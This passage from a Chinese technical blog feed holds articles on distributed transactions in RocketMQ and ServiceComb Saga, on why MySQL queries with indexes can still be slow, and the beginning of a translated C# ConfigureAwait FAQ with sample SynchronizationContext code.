<h1 id="开源项目的分布式事务实现解读"><a href="#开源项目的分布式事务实现解读" class="headerlink" title="开源项目的分布式事务实现解读"></a>开源项目的分布式事务实现解读</h1><h2 id="RocketMQ"><a href="#RocketMQ" class="headerlink" title="RocketMQ"></a>RocketMQ</h2><p>&emsp;&emsp;Apache RocketMQ 是阿里开源的一款高性能、高吞吐量的分布式消息中间件。在历年双 11 中，RocketMQ 都承担了阿里巴巴生产系统全部的消息流转，在核心交易链路有着稳定和出色的表现，是承载交易峰值的核心基础产品之一。<br>&emsp;&emsp;Apache RocketMQ 4.3 版本正式支持分布式事务消息。RocketMQ 事务消息设计主要解决了生产者端的消息发送与本地事务执行的原子性问题，换句话说，如果本地事务执行不成功，则不会进行 MQ 消息推送。那么，聪明的你可能就会存在疑问：我们可以先执行本地事务，执行成功了再发送 MQ 消息，这样不就可以保证事务性的？但是，请你再认真的思考下，如果 MQ 消息发送不成功怎么办呢？事实上，RocketMQ 对此提供一个很好的思路和解决方案。<br>&emsp;&emsp;RocketMQ 首先会发送预执行消息到 MQ，并且在发送预执行消息成功后执行本地事务。紧接着，它根据本地事务执行结果进行后续执行逻辑，如果本地事务执行结果是 commit，那么正式投递 MQ 消息，如果本地事务执行结果是 rollback，则 MQ 删除之前投递的预执行消息，不进行投递下发。注意的是，对于异常情况，例如执行本地事务过程中，服务器宕机或者超时，RocketMQ 将会不停的询问其同组的其他生产者端来获取状态。</p>
<figure class="image-box">
                <img src="13.png" alt title class>
                <p></p>
            </figure>

<h2 id="ServiceComb"><a href="#ServiceComb" class="headerlink" title="ServiceComb"></a>ServiceComb</h2><p>&emsp;&emsp;ServiceComb 基于华为内部的 CSE(Cloud Service Engine) 框架开源而来，它提供了一套包含代码框架生成、服务注册发现、负载均衡、服务可靠性（容错熔断，限流降级，调用链追踪）等功能的微服务框架。其中，ServiceComb Saga 是一个微服务应用的数据最终一致性解决方案。<br>&emsp;&emsp;Saga 拆分分布式事务为多个本地事务，然后由 Saga 引擎负责协调。如果整个流程正常结束，那么业务成功完成；如果在这过程中实现出现部分失败，那么 Saga 引擎调用补偿操作。Saga 有两种恢复的策略：向前恢复和向后恢复。其中，向前恢复对失败的节点采取最大努力不断重试，保证数据库的操作最终一定可以保证数据一致性，如果最终多次重试失败可以根据相关日志主动通知开发人员进行手工介入。向后恢复对之前所有成功的节点执行回滚的事务操作，这样保证数据达到一致的效果。<br>&emsp;&emsp;Saga 与 TCC 不同之处在于，Saga 比 TCC 少了一个 Try 操作。因此，Saga 会直接提交到数据库，然后出现失败的时候，进行补偿操作。Saga 的设计可能导致在极端场景下的补偿动作比较麻烦，但是对于简单的业务逻辑侵入性更低，更轻量级，并且减少了通信次数。</p>
<figure class="image-box">
                <img src="14.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;ServiceComb Saga 在其理论基础上进行了扩展，它包含两个组件：alpha 和 omega。alpha 充当协调者，主要负责对事务的事件进行持久化存储以及协调子事务的状态，使其得以最终与全局事务的状态保持一致。omega 是微服务中内嵌的一个 agent，负责对网络请求进行拦截并向 alpha 上报事务事件，并在异常情况下根据 alpha 下发的指令执行相应的补偿操作。在预处理阶段，alpha 会记录事务开始的事件；在后处理阶段，alpha 会记录事务结束的事件。因此，每个成功的子事务都有一一对应的开始及结束事件。在服务生产方，omega 会拦截请求中事务相关的 id 来提取事务的上下文。在服务消费方，omega 会在请求中注入事务相关的 id 来传递事务的上下文。通过服务提供方和服务消费方的这种协作处理，子事务能连接起来形成一个完整的全局事务。注意的是，Saga 要求相关的子事务提供事务处理方法，并且提供补偿函数。<br>&emsp;&emsp;现在，我们来看一下它的业务流程图：</p>
<figure class="image-box">
                <img src="15.png" alt title class>
                <p></p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[为什么我使用了索引，查询还是慢？]]></title>
      <url>/2020/01/20/WhyItIsStillSlowWhenUsingIndex/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/jackyfei/p/12122767.html" target="_blank" rel="noopener">https://www.cnblogs.com/jackyfei/p/12122767.html</a></p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;经常有同学问我，我的一个 SQL 语句使用了索引，为什么还是会进入到慢查询之中呢？今天我们就从这个问题开始来聊一聊索引和慢查询。<br>&emsp;&emsp;另外插入一个题外话，个人认为团队要合理的使用 ORM，可以参考我的另外一篇 <a href="https://www.cnblogs.com/jackyfei/p/orm.html" target="_blank" rel="noopener">ORM 的权衡和抉择</a>。合理利用的是 ORM 在面向对象和写操作方面的优势，避免联合查询上可能产生的坑(当然如果你的 Linq 查询能力很强另当别论)，因为 ORM 屏蔽了太多的 DB 底层的知识内容，对程序员不是件好事，对性能有极致追求，但是 ORM 理解不透彻的团队更加要谨慎。</p>
<h1 id="案例剖析"><a href="#案例剖析" class="headerlink" title="案例剖析"></a>案例剖析</h1><p>&emsp;&emsp;言归正传，为了实验，我创建了如下表：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`T`</span>(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`a`</span> <span class="built_in">int</span>(<span class="number">11</span>) DEFAUT <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="string">`id`</span>),</span><br><span class="line"><span class="keyword">KEY</span> <span class="string">`a`</span>(<span class="string">`a`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该表有三个字段，其中用 id 是主键索引，a 是普通索引。</p>
<p>&emsp;&emsp;首先 SQL 判断一个语句是不是慢查询语句，用的是语句的<strong>执行时间</strong>。他把语句执行时间跟<code>long_query_time</code>这个系统参数作比较，如果语句执行时间比它还大，就会把这个语句记录到慢查询日志里面，这个参数的默认值是 10 秒。当然在生产上，我们不会设置这么大，一般会设置 1 秒，对于一些比较敏感的业务，可能会设置一个比 1 秒还小的值。<br>&emsp;&emsp;语句执行过程中有没有用到表的索引，可以通过 explain 一个语句的输出结果来看 KEY 的值不是 <em>NULL</em> 。</p>
<p>&emsp;&emsp;我们看下<code>explain select * from t;</code>的 KEY 结果是 <em>NULL</em> 。</p>
<figure class="image-box">
                <img src="127185-20191230235703940-953153691.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<code>explain select * from t where id=2;</code>的 KEY 结果是 <em>PRIMARY</em> ，就是我们常说的使用了主键索引。</p>
<figure class="image-box">
                <img src="127185-20191230235848320-1277891431.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<code>explain select a from t;</code>的 KEY 结果是 a，表示使用了 a 这个索引。</p>
<figure class="image-box">
                <img src="127185-20191231000005395-549365412.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;虽然后两个查询的 KEY 都不是 <em>NULL</em> ，但是最后一个实际上扫描了整个索引树 a。<br>&emsp;&emsp;假设这个表的数据量有 100 万行，图二的语句还是可以执行很快，但是图三就肯定很慢了。如果是更极端的情况，比如，这个数据库上 CPU 压力非常的高，那么可能第2个语句的执行时间也会超过<code>long_query_time</code>，会进入到慢查询日志里面。</p>
<p>&emsp;&emsp;所以我们可以得出一个结论：<strong>是否使用索引和是否进入慢查询之间并没有必然的联系</strong>。使用索引只是表示了一个 SQL 语句的执行过程，而是否进入到慢查询是由它的执行时间决定的，而这个执行时间，可能会受各种外部因素的影响。换句话来说，使用了索引你的语句可能依然会很慢。</p>
<h1 id="全索引扫描的不足"><a href="#全索引扫描的不足" class="headerlink" title="全索引扫描的不足"></a>全索引扫描的不足</h1><p>&emsp;&emsp;那如果我们在更深层次的看这个问题，其实他还潜藏了一个问题需要澄清，就是什么叫做使用了索引。<br>&emsp;&emsp;我们都知道，InnoDB 是索引组织表，所有的数据都是存储在索引树上面的。比如上面的表 t，这个表包含了两个索引，一个主键索引和一个普通索引。在 InnoDB 里，数据是放在主键索引里的。如图所示：</p>
<figure class="image-box">
                <img src="127185-20191231001858399-761094562.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;可以看到数据都放在主键索引上，如果从逻辑上说，所有的 InnoDB 表上的查询，都至少用了一个索引，所以现在我问你一个问题，如果你执行<code>select from t where id&gt;0</code>，你觉得这个语句有用上索引吗？</p>
<figure class="image-box">
                <img src="127185-20191231002153612-543561900.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;我们看上面这个语句的 explain 的输出结果显示的是 <em>PRIMARY</em> 。其实从数据上你是知道的，这个语句一定是做了全面扫描。但是优化器认为，这个语句的执行过程中，需要根据主键索引，定位到第 1 个满足 ID &gt; 0 的值，也算用到了索引。</p>
<p>&emsp;&emsp;所以即使 explain 的结果里写的 <strong>KEY 不是 <em>NULL</em> ，实际上也可能是全表扫描</strong>的，因此 InnoDB 里面只有一种情况叫做没有使用索引，那就是从主键索引的最左边的叶节点开始，向右扫描整个索引树。</p>
<p>也就是说，没有使用索引并不是一个准确的描述。</p>
<ul>
<li>你可以用<strong>全表扫描</strong>来表示一个查询遍历了<strong>整个主键索引树</strong>；</li>
<li>也可以用<strong>全索引扫描</strong>，来说明像<code>select a from t;</code>这样的查询，他扫描了<strong>整个普通索引树</strong>；</li>
<li>而<code>select * from t where id=2</code>这样的语句，才是我们平时说的使用了索引。他表示的意思是，我们使用了索引的快速搜索功能，并且有效的减少了扫描行数。</li>
</ul>
<h1 id="索引的过滤性要足够好"><a href="#索引的过滤性要足够好" class="headerlink" title="索引的过滤性要足够好"></a>索引的过滤性要足够好</h1><p>&emsp;&emsp;根据以上解剖，我们知道全索引扫描会让查询变慢，接下来就要来谈谈索引的过滤性。<br>&emsp;&emsp;假设你现在维护了一个表，这个表记录了中国 14 亿人的基本信息，现在要查出所有年龄在 10 ~ 15 岁之间的姓名和基本信息，那么你的语句会这么写，<code>select * from t_people where age between 10 and 15</code>。<br>&emsp;&emsp;你一看这个语句一定要在 age 字段上开始建立索引了，否则就是个全面扫描，但是你会发现，在你建立索引以后，这个语句还是执行慢，因为满足这个条件的数据可能有超过 1 亿行。<br>&emsp;&emsp;我们来看看建立索引以后，这个表的组织结构图：</p>
<figure class="image-box">
                <img src="127185-20191231004118284-1830591492.png" alt title class>
                <p></p>
            </figure>

<p>这个语句的执行流程是这样的：</p>
<ol>
<li>从索引上用树搜索，取到第 1 个 age 等于 10 的记录，得到它的主键 id 的值，根据 id 的值去主键索引取整行的信息，作为结果集的一部分返回；</li>
<li>在索引 age 上向右扫描，取下一个 id 的值，到主键索引上取整行信息，作为结果集的一部分返回；</li>
<li>重复上面的步骤，直到碰到第 1 个 age 大于 15 的记录。</li>
</ol>
<p>&emsp;&emsp;你看这个语句，虽然他用了索引，但是他扫描超过了 1 亿行。所以你现在知道了，当我们在讨论有没有使用索引的时候，其实我们关心的是<strong>扫描行数</strong>。</p>
<p>&emsp;&emsp;<strong>对于一个大表，不止要有索引，索引的过滤性还要足够好。</strong><br>&emsp;&emsp;像刚才这个例子的 age，它的过滤性就不够好，在设计表结构的时候，我们要让所有的过滤性足够好，也就是区分度足够高。</p>
<h1 id="回表的代价"><a href="#回表的代价" class="headerlink" title="回表的代价"></a>回表的代价</h1><p>&emsp;&emsp;那么过滤性好了，是不是表示查询的扫描行数就一定少呢？<br>&emsp;&emsp;我们再来看一个例子：<br>&emsp;&emsp;如果你的执行语句是<code>select * from t_people where name=&#39;张三&#39; and age=8</code><br>&emsp;&emsp;t_people 表上有一个索引是姓名和年龄的联合索引，那这个联合索引的过滤性应该不错，可以在联合索引上快速找到第 1 个姓名是张三，并且年龄是 8 的小朋友，当然这样的小朋友应该不多，因此向右扫描的行数很少，查询效率就很高。<br>&emsp;&emsp;但是查询的过滤性和索引的过滤性可不一定是一样的，如果现在你的需求是查出所有名字的第 1 个字是张，并且年龄是 8 岁的所有小朋友，你的语句会怎么写呢？<br>&emsp;&emsp;很显然你会这么写：<code>select * from t_people where name like &#39;张%&#39; and age=8;</code><br>&emsp;&emsp;在 MySQL 5.5 和之前的版本中，这个语句的执行流程是这样的：</p>
<figure class="image-box">
                <img src="127185-20191231005952670-1472639774.png" alt title class>
                <p></p>
            </figure>

<ol>
<li>首先从联合索引上找到第 1 个年龄字段是张开头的记录，取出主键 id，然后到主键索引树上，根据 id 取出整行的值；</li>
<li>判断年龄字段是否等于 8，如果是就作为结果集的一行返回，如果不是就丢弃。</li>
<li>在联合索引上向右遍历，并重复做回表和判断的逻辑，直到碰到联合索引树上名字的第 1 个字不是张的记录为止。</li>
</ol>
<p>&emsp;&emsp;我们把根据 id 到主键索引上查找整行数据这个动作，称为<strong>回表</strong>。你可以看到这个执行过程里面，最耗费时间的步骤就是回表，假设全国名字第 1 个字是张的人有 8000 万，那么这个过程就要回表 8000 万次，在定位第一行记录的时候，只能使用索引和联合索引的最左前缀，最称为<strong>最左前缀原则</strong>。<br>&emsp;&emsp;你可以看到这个执行过程，它的回表次数特别多，性能不够好，有没有优化的方法呢？<br>&emsp;&emsp;在 MySQL 5.6 版本，引入了 index condition pushdown 的优化。我们来看看这个优化的执行流程：</p>
<figure class="image-box">
                <img src="127185-20191231010949787-983058366.png" alt title class>
                <p></p>
            </figure>

<ol>
<li>首先从联合索引树上，找到第 1 个年龄字段是张开头的记录，判断这个索引记录里面，年龄的值是不是 8，如果是就回表，取出整行数据，作为结果集的一部分返回，如果不是就丢弃；</li>
<li>在联合索引树上，向右遍历，并判断年龄字段后，根据需要做回表，直到碰到联合索引树上名字的第 1 个字不是张的记录为止。</li>
</ol>
<p>&emsp;&emsp;这个过程跟上面的差别，是在遍历联合索引的过程中，将年龄等于 8 的条件下推到所有遍历的过程中，减少了回表的次数，假设全国名字第 1 个字是张的人里面，有 100 万个是 8 岁的小朋友，那么这个查询过程中在联合索引里要遍历 8000 万次，而回表只需要 100 万次。</p>
<h1 id="虚拟列"><a href="#虚拟列" class="headerlink" title="虚拟列"></a>虚拟列</h1><p>&emsp;&emsp;可以看到这个优化的效果还是很不错的，但是这个优化还是没有绕开最左前缀原则的限制，因此在联合索引你还是要扫描 8000 万行，那有没有更进一步的优化方法呢？<br>&emsp;&emsp;我们可以考虑把名字的第一个字和 age 来做一个联合索引。这里可以使用 MySQL 5.7 引入的<strong>虚拟列</strong>来实现。对应的修改表结构的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_people <span class="keyword">add</span> name_first <span class="built_in">varchar</span>(<span class="number">2</span>) <span class="keyword">generated</span> (<span class="keyword">left</span>(<span class="keyword">name</span>,<span class="number">1</span>)),<span class="keyword">add</span> <span class="keyword">index</span>(name_first,age);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们来看这个 SQL 语句的执行效果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_people`</span>(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) DEFAUT <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`name_first`</span> <span class="built_in">varchar</span>(<span class="number">2</span>) <span class="keyword">GENERATED</span> <span class="keyword">ALWAYS</span> <span class="keyword">AS</span> (<span class="keyword">left</span>(<span class="string">`name`</span>,<span class="number">1</span>)) <span class="keyword">VIRTUAL</span>,<span class="keyword">KEY</span> <span class="string">`name_first`</span>(<span class="string">`name_first`</span>,<span class="string">'age'</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;首先他在 people 上创建一个字段叫 name_first 的虚拟列，然后给 name_first 和 age 上创建一个联合索引，并且，让这个虚拟列的值总是等于 name 字段的前两个字节，虚拟列在插入数据的时候不能指定值，在更新的时候也不能主动修改，它的值会根据定义自动生成，在 name 字段修改的时候也会自动修改。<br>&emsp;&emsp;有了这个新的联合索引，我们在找名字的第 1 个字是张，并且年龄为 8 的小朋友的时候，这个 SQL 语句就可以这么写：<code>select * from t_people where name_first=&#39;张&#39; and age=8</code>。<br>&emsp;&emsp;这样这个语句的执行过程，就只需要扫描联合索引的 100 万行，并回表 100 万次，这个优化的本质是我们创建了一个更紧凑的索引，来加速了查询的过程。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp;本文给你介绍了索引的基本结构和一些查询优化的基本思路，你现在知道了，使用索引的语句也有可能是慢查询，我们的查询优化的过程，往往就是减少扫描行数的过程。</p>
<p>慢查询归纳起来大概有这么几种情况：</p>
<ul>
<li>全表扫描</li>
<li>全索引扫描</li>
<li>索引过滤性不好</li>
<li>频繁回表的开销</li>
</ul>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>&emsp;&emsp;假设业务要求的就是要统计年龄在 10 - 15 岁的 14 亿人的数量，不能增加过滤因子，那该怎么办？(<code>select * from t_people where age between 10 and 15</code>)<br>&emsp;&emsp;假设该统计必须是 OLTP，实时展示统计数据，又该怎么解决？</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C# 中 ConfigureAwait 相关答疑 FAQ]]></title>
      <url>/2020/01/20/ConfigureAwaitFAQsInCSharp/</url>
      <content type="html"><![CDATA[<blockquote>
<p>译文：<a href="https://www.cnblogs.com/ms27946/p/ConfigureAwait-FAQs-In-CSharp.html" target="_blank" rel="noopener">https://www.cnblogs.com/ms27946/p/ConfigureAwait-FAQs-In-CSharp.html</a><br>原文：<a href="https://devblogs.microsoft.com/dotnet/configureawait-faq/" target="_blank" rel="noopener">https://devblogs.microsoft.com/dotnet/configureawait-faq/</a>  </p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;.NET 加入 async/await 特性已经有 7 年了。这段时间，它蔓延的非常快，广泛；不只在 .NET 生态系统，也出现在其他语言和框架中。在 .NET 中，他见证了许多了改进，利用异步在其他语言结构（additional language constructs）方面，提供了支持异步的 API，在基础设施中标记 async/await 作为最基本的优化（特别是在 .NET Core 的性能和分析能力上）。<br>&emsp;&emsp;然而，async/await 另一方面也带来了一个问题，那就是 <strong>ConfigureAwait</strong> 。在这片文章中，我会解答它们。我尝试在这篇文章从头到尾变得更好读，能作为一个友好的答疑清单，能为以后提供参考。</p>
<h1 id="什么是-SynchronizationContext"><a href="#什么是-SynchronizationContext" class="headerlink" title="什么是 SynchronizationContext"></a>什么是 SynchronizationContext</h1><p>&emsp;&emsp;<code>System.Threading.SynchronizationContext</code><a href="https://docs.microsoft.com/en-us/dotnet/api/system.threading.synchronizationcontext" target="_blank" rel="noopener">文档</a>描述它“它提供一个最基本的功能，在各种同步模型中传递同步上下文”，除此之外并无其他描述。<br>&emsp;&emsp;对于它的 99% 的使用案例，<code>SynchronizationContext</code>只是提供一个虚拟的<code>Post</code>的方法的类，它传递一个委托异步执行（这里面其实还有其他很多虚拟成员变量，但很少用到，并且与我们这次讨论不相关）。这个类的<code>Post</code>方法仅仅只是调用<code>ThreadPool.QueueUserWorkItem</code>来异步执行前面传递的委托。但是，那些派生类能够覆写<code>Post</code>方法，这样就能在大多数合适的地方和时间执行。<br>&emsp;&emsp;举个例子，Windows Forms 有一个<code>SynchronizationContext</code><a href="https://github.com/dotnet/winforms/blob/94ce4a2e52bf5d0d07d3d067297d60c8a17dc6b4/src/System.Windows.Forms/src/System/Windows/Forms/WindowsFormsSynchronizationContext.cs" target="_blank" rel="noopener">派生类</a>，它覆写了<code>Post</code>方法，这个方法所做的其实就等价于<code>Control.BeginInvoke</code>。那就是说所有调用这个<code>Post</code>方法都将会引起这个委托在这个控件相关联的线程上被调用，这个线程被称为 “UI 线程”。Windows Forms 依靠 Win32 上的消息处理程序以及还有一个“消息循环”在 UI 线程上运行，它只是简单的等待处理新到达的消息。那些消息可能是鼠标移动和点击，也可能是键盘输入、系统事件，委托以及可调用的委托等。所以为 Windows Forms 应用程序的 UI 线程提供一个<code>SynchronizationContext</code>实例，为了让它能够在 UI 线程上执行委托，需要做的就只是简单将委托传递给<code>Post</code>。<br>&emsp;&emsp;对于 WPF 来说也是如此。它也有它自己的<code>SynchronizationContext</code><a href="https://github.com/dotnet/wpf/blob/ac9d1b7a6b0ee7c44fd2875a1174b820b3940619/src/Microsoft.DotNet.Wpf/src/WindowsBase/System/Windows/Threading/DispatcherSynchronizationContext.cs" target="_blank" rel="noopener">派生类</a>，覆写了<code>Post</code>，同样类似的，将传递一个委托给 UI 线程（通过调用 <code>Dispatcher.BeinInvoke</code>），在这个例子中是受 WPF Dispatcher 而不是 Windows Forms 控件管理的。<br>&emsp;&emsp;对于 Windows 运行时（WinRT）。它同样有自己的<code>SynchronizationContext</code><a href="https://github.com/dotnet/runtime/blob/60d1224ddd68d8ac0320f439bb60ac1f0e9cdb27/src/libraries/System.Runtime.WindowsRuntime/src/System/Threading/WindowsRuntimeSynchronizationContext.cs" target="_blank" rel="noopener">派生类</a>，覆写<code>Post</code>，通过<code>CoreDispatcher</code>排队委托给 UI 线程。<br>&emsp;&emsp;这不仅仅只是“在 UI 线程上运行委托”。任何人都能实现<code>SynchronizationContext</code>来覆写<code>Post</code>来做任何事。例如，我也许不关心线程运行委托所做的事，但是我想确保所有在我编写的<code>SynchronizationContext</code>的方法<code>Post</code>都能以一定程度的并发度执行。我可以实现这样一个自定义的<code>SynchronizationContext</code>类，像下面一样：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">MaxConcurrencySynchronizationContext</span>: <span class="title">SynchronizationContext</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> SemaphoreSlim _semaphore;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxConcurrencySynchronizationContext</span>(<span class="params"><span class="keyword">int</span> maxConcurrencyLevel</span>)</span> =&gt;</span><br><span class="line">        _semaphore = <span class="keyword">new</span> SemaphoreSlim(maxConcurrencyLevel);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Post</span>(<span class="params">SendOrPostCallback d, <span class="keyword">object</span> state</span>)</span> =&gt;</span><br><span class="line">        _semaphore.WaitAsync().ContinueWith(<span class="keyword">delegate</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123; d(state); &#125; <span class="keyword">finally</span> &#123; _semaphore.Release(); &#125;</span><br><span class="line">        &#125;, <span class="keyword">default</span>, TaskContinuationOptions.None, TaskScheduler.Default);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Send</span>(<span class="params">SendOrPostCallback d, <span class="keyword">object</span> state</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _semaphore.Wait();</span><br><span class="line">        <span class="keyword">try</span> &#123; d(state); &#125; <span class="keyword">finally</span> &#123; _semaphore.Release(); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;事实上，单元测试框架 xunit 提供了一个<code>SynchronizationContext</code><a href="https://github.com/xunit/xunit/blob/d81613bf752bb4b8774e9d4e77b2b62133b0d333/src/xunit.execution/Sdk/MaxConcurrencySyncContext.cs" target="_blank" rel="noopener">派生类</a>与上面非常相似，它用来限制与能够并行运行的测试相关的代码量。<br>&emsp;&emsp;所有的这些好处就根抽象一样：它提供一个单独的 API，用来根据具体实现的创造者的期望来对委托进行排队处理（it provides a single API that can be used to queue a delegate for handling however the creator of the implementation desires），而不需要知道具体实现的细节。<br>&emsp;&emsp;所以，如果我们在编写类库的时候，并且想要进行和执行相同的工作，那么就排队委托给原来位置的“上下文”，那么我就只需要获取这个“同步上下文”，并占有它，然后当完成我的工作时调用这个上下文中的<code>Post</code>来传递我想要调用的委托。于 Windows Forms，我不必知道我应该获取一个<code>Control</code>并且调用它的<code>BegeinInvoke</code>，或者对于 WPF，我不用知道我应该获取一个<code>Dispatcher</code>并且调用它的<code>BeginInvoke</code>，又或是在 xunit，我应该获取它的上下文并排队传递；我只需要获取当前的<code>SynchronizationContext</code>并调用它。为了这个目的，<code>SynchronizationContext</code>提供一个<code>Currenct</code>属性，为了实现上面说的，我可以像下面这样编写代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoWork</span>(<span class="params">Action worker, Action completion</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SynchronizationContext sc = SynchronizationContext.Current;</span><br><span class="line">    ThreadPool.QueueUserWorkItem(_ =&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">            worker();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            sc.Post(_ =&gt; completion(), <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;框架公开了一个自定义上下文，从<code>Current</code>使用了 <code>SynchronizationContext.SetSynchronizationContext</code>方法。（A framework that wants to expose a custom context from <code>Current</code> uses the <code>SynchronizationContext.SetSynchronizationContext</code> method.）</p>
<h1 id="什么是-TaskScheduler"><a href="#什么是-TaskScheduler" class="headerlink" title="什么是 TaskScheduler"></a>什么是 TaskScheduler</h1><p>&emsp;&emsp;对于“调度器”，<code>SynchronizationContext</code>是一个抽象类。并且个别的框架有时候拥有自己的抽象，<code>System.Threading.Task</code>也不例外。当任务被那些排队及执行的委托支持（backed）时，它们与<code>System.Threading.Task.TaskScheduler</code>相关。就好比<code>SynchronizationContext</code>提供一个虚拟的<code>Post</code>方法对委托的调用进行排队（稍后实现通过使用典型的委托机制来调用委托），<code>TaskScheduler</code>提供一个抽象方法<code>QueueTask</code>（稍后通过<code>ExecuteTask</code>方法来调用该任务）。<br>&emsp;&emsp;默认的调度器会通过<code>TaskScheduler.Default</code>返回的是一个线程池，但是可能派生自<code>TaskScheduler</code>并相关的方法，来完成以何时何地的调用任务的这个行为。举个例子，核心库包含<code>System.Threading.Tasks.ConcurrentExclusiveSchedulerPair</code>类型。这个类的实例暴露了两个<code>TaskScheduler</code>属性，一个调用自<code>ExclusiveScheduler</code>，另一个调用自<code>ConcurrentScheduler</code>。那些被调度到<code>ConcurrentScheduler</code>的任务可能是并行运行的，但是在构建它时，会受制于被受限的<code>ConcurrentExclusiveSchedulerPair</code>（与前面展示的 <em>MaxConcurrencySynchronizationContext</em> 相似），当一个正在运行的任务被调度器调度到<code>ExclusiveScheduler</code>时，<code>ConcurrentScheduler</code>任务将不会执行，一次只运行一个独立任务。这样的话，它行为就很像一个读写锁。<br>&emsp;&emsp;像<code>SynchronizationContext</code>，<code>TaskScheduler</code>都有一个<code>Current</code>属性，它会返回一个 “current”<code>Taskscheduler</code>。而不像<code>SynchronizationContext</code>，这里不存在方法可以设置当前调度器。相反，当前的调度器是一个与当前正在运行的任务相关，并且这个调度器作为启动任务的一部分提供给给系统。例如下面这个程序将会输出 “True”，与<code>StartNew</code>一起使用的 lambda 在<code>ConcurrentExclusiveSchedulerPair</code>的<code>ExclusiveScheduler</code>方法上调用，并且将会看到<code>TaskScheduler.Current</code>被设置（原文：as the lambda used with <code>StartNew</code> is executed on the <code>ConcurrentExclusiveSchedulerPair</code>‘s <code>ExclusiveScheduler</code> and will see <code>TaskScheduler.Current</code> set to that scheduler）：</p>
